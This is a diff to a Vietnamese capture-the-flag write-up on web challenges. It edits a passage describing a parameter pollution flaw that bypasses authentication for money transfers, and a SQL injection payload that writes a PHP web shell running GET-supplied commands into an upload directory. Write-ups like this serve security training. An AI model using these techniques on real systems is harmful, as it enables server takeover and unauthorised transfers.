@@ -47,7 +47,7 @@ Thử với `http://web3.efiens.com/index.php?debug=1` sẽ nhìn thấy suorce 
 
 - Sau đó chương trình gửi thêm một post request tới `$url_transfer` với data = `$qry_str`
 
-Có thể thấy do `$qry_str` là chuỗi có thể kiểm soát thông, và tham số xác thực `$auth` được đặt trước `$money` thì đây là dấu hiệu của lỗi `Parameter Pollution`
+Có thể thấy do `$qry_str` là chuỗi có thể kiểm soát, và tham số xác thực `$auth` được đặt trước `$money` ,thì đây là dấu hiệu của lỗi `Parameter Pollution`
 #### Exploit
 
 Như vậy, chúng ta có thể gửi tiền từ tài khoản bất kì (không cần đúng nhập đúng mật khẩu) đến một người khác thông qua việc ghi đè tham số `auth` trong `money` để `auth` luôn đúng!
@@ -212,7 +212,7 @@ Có vẻ mình bỏ qua chỗ nào đó. Nhớ lúc đầu, trước khi lấy �
 Vậy công việc còn lại là upload shell vào thư mục đó nữa là xong
 
 Payload: 
-`' union select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/admin_a2dc213f531a2f5581de515ddaf81ca3/Upload/test2.php' -- -`
+`' union select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/admin_a2dc213f531a2f5581de515ddaf81ca3/Upload/shell.php' -- -`
 
 <img src="img/upload_shell.png">
 
